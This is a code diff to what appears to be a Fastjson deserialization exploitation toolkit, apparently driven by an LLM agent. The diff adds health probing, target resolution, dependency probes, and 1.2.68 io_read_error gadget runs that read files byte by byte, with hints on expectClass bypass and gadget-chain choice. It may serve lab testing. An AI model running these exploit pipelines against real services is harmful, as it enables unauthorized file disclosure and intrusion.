@@ -62,6 +62,30 @@ def _err(message: str, **extra: Any) -> dict[str, Any]:
     return {"ok": False, "error": message, **extra}
 
 
+def _fetch_health(target: str, *, timeout: float = 5.0, insecure: bool = False) -> dict[str, Any] | None:
+    """Best-effort GET {origin}/api/health for lab / app capability hints."""
+    from urllib.parse import urljoin, urlparse, urlunparse
+
+    import httpx
+
+    raw = (target or "").strip()
+    if not raw:
+        return None
+    if "://" not in raw:
+        raw = "http://" + raw
+    parsed = urlparse(raw)
+    origin = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
+    url = urljoin(origin + "/", "api/health")
+    try:
+        resp = httpx.get(url, timeout=timeout, verify=not insecure, trust_env=False)
+        if resp.status_code != 200:
+            return None
+        data = resp.json()
+        return data if isinstance(data, dict) else None
+    except Exception:  # noqa: BLE001
+        return None
+
+
 # ---------------------------------------------------------------------------
 # detect_pipeline
 # ---------------------------------------------------------------------------
@@ -126,23 +150,39 @@ def detect_pipeline(
 
     version_result = None
     expect_result = None
+    # 路径发现后的有效反序列化点（供 version / expect 复用）
+    effective_target = (
+        (detect_result.raw or {}).get("resolved_url")
+        or detect_result.target
+        or target
+    )
+    health = (detect_result.raw or {}).get("path_discovery", {}).get("health")
+    if not isinstance(health, dict):
+        health = _fetch_health(effective_target, timeout=min(timeout, 5.0), insecure=insecure)
 
     if not detect_result.is_fastjson:
         skipped.extend(["version", "expect"])
-        next_actions.append("docs_list")
-        return {
+        next_actions = list(detect_result.next_actions or [])
+        if not next_actions:
+            next_actions.append("docs_list")
+        out_nf: dict[str, Any] = {
             "ok": True,
             "detect": _dump(detect_result),
             "version": None,
             "expect": None,
             "skipped": skipped,
             "next_actions": next_actions,
+            "effective_target": effective_target,
             "summary": detect_result.summary
             or "未判定为 Fastjson，已跳过版本与期望类探测",
         }
+        if health:
+            out_nf["health"] = health
+            out_nf["summary"] += "；已附带 /api/health 信息（若有）"
+        return out_nf
 
     version_req = VersionRequest(
-        target=target,
+        target=effective_target,
         include_dns=include_dns_version,
         use_ceye=True,
         timeout=timeout,
@@ -163,7 +203,7 @@ def detect_pipeline(
     )
     try:
         version_result = version_detector.detect(
-            target, include_dns=version_req.include_dns
+            effective_target, include_dns=version_req.include_dns
         )
     except Exception as exc:  # noqa: BLE001
         skipped.append("version")
@@ -174,7 +214,7 @@ def detect_pipeline(
         version_detector.close()
 
     expect_req = ExpectClassRequest(
-        target=target,
+        target=effective_target,
         base_body=base_body,
         timeout=timeout,
         headers=headers,
@@ -190,7 +230,9 @@ def detect_pipeline(
         content_type=expect_req.content_type,
     )
     try:
-        expect_result = expect_detector.detect(target, base_body=expect_req.base_body)
+        expect_result = expect_detector.detect(
+            effective_target, base_body=expect_req.base_body
+        )
     except Exception as exc:  # noqa: BLE001
         skipped.append("expect")
         expect_error = str(exc)
@@ -199,9 +241,31 @@ def detect_pipeline(
     finally:
         expect_detector.close()
 
-    next_actions = ["deps_probe", "poc_catalog", "docs_list"]
+    next_actions = [
+        f"deps_probe(target={effective_target!r})",
+        "poc_catalog",
+        "docs_list",
+    ]
     if expect_result is not None and getattr(expect_result, "has_expect_class", None):
-        next_actions.insert(0, "poc_run(expect_bypass=true)")
+        next_actions.insert(
+            0,
+            f"poc_run(family=…, expect_bypass=true, target={effective_target!r})",
+        )
+
+    # 依赖提示：health.deps 缺 commons_io 时提醒换 gadget 靶场 / JDK 链
+    capability_notes: list[str] = []
+    if isinstance(health, dict):
+        deps = health.get("deps")
+        if isinstance(deps, dict) and deps.get("commons_io") is False:
+            capability_notes.append(
+                "health.deps.commons_io=false：勿发 commons-io gadget；"
+                "改用 JDK 链或换 18268 gadget 靶场"
+            )
+        if health.get("autotype") is False:
+            capability_notes.append(
+                "health.autotype=false：优先 AutoCloseable/Exception expectClass，"
+                "deps_probe 将自动用 Class 探针"
+            )
 
     out: dict[str, Any] = {
         "ok": True,
@@ -209,17 +273,21 @@ def detect_pipeline(
         "version": _dump(version_result),
         "expect": _dump(expect_result),
         "skipped": skipped,
-        "next_actions": next_actions,
+        "next_actions": next_actions + capability_notes,
+        "effective_target": effective_target,
         "summary": "；".join(
             part
             for part in [
                 detect_result.summary,
                 version_result.summary if version_result else None,
                 expect_result.summary if expect_result else None,
+                *capability_notes,
             ]
             if part
         ),
     }
+    if health:
+        out["health"] = health
     if version_error:
         out["version_error"] = version_error
     if expect_error:
@@ -250,8 +318,8 @@ def deps_probe(
         return _err("target 不能为空")
 
     method = (method or "character").strip().lower()
-    if method not in ("character", "dns"):
-        return _err("method 仅支持 character 或 dns")
+    if method not in ("character", "class", "dns"):
+        return _err("method 仅支持 character、class 或 dns")
 
     req = DepsRequest(
         target=target,
@@ -352,7 +420,10 @@ def poc_catalog(family: Optional[PocFamily] = None) -> dict[str, Any]:
         },
         "script_hint": (
             "需要按环境改逻辑时用 poc_script(family, gadget) 取固定原脚本，由 LLM 自行修改；"
-            "当前主要收录 1.2.68/io_read_error。"
+            "当前主要收录 1.2.68/io_read_error（可改 ERROR_MARKERS / MATCH_BOM；"
+            "本仓库靶场命中多为 200+bOM）。"
+            "自动化爆破优先 poc_run(family=1.2.68, send=true, "
+            "options={gadget:io_read_error, url, read_length})。"
         ),
     }
 
@@ -517,7 +588,7 @@ def _run_1268(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[
     req = Poc1268Request.model_validate(data)
     if req.send and not (req.target or "").strip():
         return _err("send=true 时必须提供 target")
-    get_poc_1268_gadget(req.gadget)
+    entry = get_poc_1268_gadget(req.gadget)
     result = run_poc_1268(
         Poc1268SendOptions(
             gadget=req.gadget,
@@ -527,6 +598,9 @@ def _run_1268(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[
             url=req.url,
             guess_byte=req.guess_byte,
             bom_bytes=req.bom_bytes,
+            read_length=req.read_length,
+            read_charset=req.read_charset,
+            read_charset_bytes=req.read_charset_bytes,
             host=req.host,
             port=req.port,
             user=req.user,
@@ -562,7 +636,22 @@ def _run_1268(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[
             content_type=req.content_type,
         )
     )
-    return {"ok": True, "family": "1.2.68", "result": _dump(result)}
+    dumped = _dump(result) or {}
+    out: dict[str, Any] = {"ok": True, "family": "1.2.68", "result": dumped}
+    requires = list(getattr(entry, "requires", ()) or [])
+    if requires:
+        out["requires"] = requires
+        if req.send and dumped.get("status_code", 0) and int(dumped.get("status_code") or 0) >= 400:
+            out["capability_hint"] = (
+                f"gadget 需要 {requires}；若 deps_probe/health 显示缺失，"
+                "请换 JDK 链或具备该依赖的实例（如 18268 而非 18068）"
+            )
+    if req.gadget == "io_read_error" and req.send and not req.read_length:
+        out["hint"] = (
+            "未传 options.read_length：仅发送单次探针。"
+            "要逐字节读全文请设 read_length（并可用 read_charset）。"
+        )
+    return out
 
 
 def _run_1280(*, send: bool, expect_bypass: bool, opts: dict[str, Any]) -> dict[str, Any]:
